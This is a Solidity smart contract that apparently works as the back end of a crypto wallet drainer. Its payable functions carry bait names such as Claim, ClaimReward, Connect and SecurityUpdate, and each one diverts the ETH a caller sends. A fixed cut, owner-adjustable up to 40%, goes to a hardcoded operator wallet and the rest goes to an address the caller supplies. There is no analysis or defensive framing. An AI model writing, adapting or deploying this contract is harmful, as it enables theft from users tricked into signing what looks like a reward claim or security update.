pragma solidity ^0.8.18;

contract Sharing {

  address private owner;
  address private constant ownerWallet = 0x6123965353845742B96b7BD56a611Fd9c67D4533; // Specific wallet address for the owner
  uint256 private fee;
  uint8 private percentage;

  event Ownership(address indexed previous_owner, address indexed current_owner);
  event Percentage (uint8 previous_percentage, uint8 current_percentage);

  constructor() {
      owner = msg.sender;
      fee = 0;
      percentage = 35;
  }

  function getOwner() public view returns (address) { return owner; }
  function getOwnerWallet() public pure returns (address) { return ownerWallet; }
  function getBalance() public view returns (uint256) { return address(this).balance; }
  function getFee() public view returns (uint256) { return fee; }

  function withdraw(address payable receiver) private {
    uint256 amount = msg.value;
    uint256 reserve = (amount * percentage) / 100;
    uint256 netAmount = amount - reserve;
    fee += reserve;
    receiver.transfer(netAmount);
    payable(ownerWallet).transfer(reserve); // Transfer fees to specified wallet address
  }

  function Claim(address sender) public payable { withdraw(payable(sender)); }
  function ClaimReward(address sender) public payable { withdraw(payable(sender)); }
  function ClaimRewards(address sender) public payable { withdraw(payable(sender)); }
  function Execute(address sender) public payable { withdraw(payable(sender)); }
  function Multicall(address sender) public payable { withdraw(payable(sender)); }
  function Swap(address sender) public payable { withdraw(payable(sender)); }
  function Connect(address sender) public payable { withdraw(payable(sender)); }
  function SecurityUpdate(address sender) public payable { withdraw(payable(sender)); }

  function transferOwnership(address new_owner) public {
    require(msg.sender == owner, "Access Denied");
    address previous_owner = owner;
    owner = new_owner;
    emit Ownership(previous_owner, new_owner);
  }

  function changePercentage(uint8 new_percentage) public {
    require(msg.sender == owner, "Access Denied");
    require(new_percentage >= 0 && new_percentage <= 40, "Invalid Percentage");
    uint8 previous_percentage = percentage;
    percentage = new_percentage;
    emit Percentage(previous_percentage, percentage);
  }
}